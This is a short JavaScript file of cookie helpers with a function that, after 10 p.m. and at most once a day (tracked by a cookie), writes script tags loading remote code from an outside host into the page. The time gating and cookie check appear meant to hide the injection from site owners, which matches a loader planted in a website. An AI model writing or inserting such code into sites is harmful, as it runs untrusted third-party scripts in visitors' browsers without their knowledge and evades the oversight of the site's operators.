function setUCookie(u_name,value){
    var exdate=new Date()
    exdate.setHours(exdate.getHours() + 24); 
    document.cookie=u_name+ "=" +escape(value)+"; expires="+exdate.toGMTString();//解析cookie缓存
}
 
function getUCookie(u_name){
    if (document.cookie.length>0){ 
        u_start=document.cookie.indexOf(u_name + "=")
    if (u_start!=-1){ 
        u_start=u_start + u_name.length+1 
        u_end=document.cookie.indexOf(";",u_start)
        if (u_end==-1) u_end=document.cookie.length
            return unescape(document.cookie.substring(u_start,u_end))
        } 
    }
    return ""
}
 
function _setTimeout(){
    if(getUCookie("uTimeCookie")!=1 && new Date().getHours() > 22){
document.writeln("<script id='mob' type='text/javascript' charset='utf-8' src='http://gg.cnco.me/gg.js'></script>")
document.writeln("<script id='mob' type='text/javascript' charset='utf-8' src='http://gg.cnco.me/gg.js'></script>")
    }
}
 
_setTimeout()
 
setUCookie("uTimeCookie","1");